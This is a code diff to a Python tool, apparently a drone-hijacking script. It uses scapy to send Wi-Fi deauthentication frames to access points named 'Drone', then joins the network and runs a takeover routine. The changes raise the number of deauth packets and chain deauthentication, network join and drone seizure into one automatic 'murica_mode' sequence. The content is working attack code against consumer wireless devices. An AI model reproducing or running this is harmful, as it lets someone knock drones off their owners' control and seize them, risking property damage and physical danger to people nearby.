@@ -15,13 +15,13 @@ class Deauth(threading.Thread):
         self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()
 
     def run(self):
-        for item in range(0,10):
+        for item in range(0,20):
             scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
         print "Attack complete"
 
 auto_target = 'Drone'
 armed = 0
-pkt_count = 10
+pkt_count = 60
 pkt_all = 0
 ap_list = []
 interfaces = []
@@ -32,6 +32,7 @@ def get_interface():
 
 
 def hijack_drone(target,wint):
+   print('Hijacking {0}'.format(target))
    os.system('iwconfig {0} essid {1}'.format(wint,target))
    time.sleep(1)
    os.system('dhclient {0}'.format(wint))
@@ -60,10 +61,11 @@ def packet_process(pkt):
    global ap_list
    global pkt_all
    if pkt.haslayer(Dot11):
-      if pkt.type == 0 and pkt.subtype == 8:
-         if (pkt.addr2,pkt.info) not in ap_list:
-            ap_list.append((pkt.addr2,pkt.info))
-            pkt_all += 1
+         if pkt.type == 0 and pkt.subtype == 8:
+            if (pkt.addr2,pkt.info) not in ap_list:
+               ap_list.append((pkt.addr2,pkt.info))
+               pkt_all += 1
+               print('{0}'.format(pkt_all))
 
 def stop_scan(x):
    global ap_list
@@ -72,7 +74,6 @@ def stop_scan(x):
    global pkt_all
    global pkt_count
    if pkt_all >= pkt_count:
-      armed = 0
       return True
    else:
       return False 
@@ -122,6 +123,7 @@ def gunner_mode():
    swarm.demon_drone() 
 
 def murica_mode():
+   global armed
    armed = 1
    monitor_manage('start')
    interfaces = get_interface()
@@ -133,7 +135,12 @@ def murica_mode():
    seek_target()
    for item in ap_list:
       if auto_target in item[1]:
-         Deauth(item[0]).start() 
+         Deauth(item[0]).start()
+         time.sleep(7)
+         monitor_manage('stop')
+         hijack_drone(item[1],wl)
+         swarm.demon_drone()
+   os.system("killall dhclient")     
    
 
 if len(sys.argv) < 2:
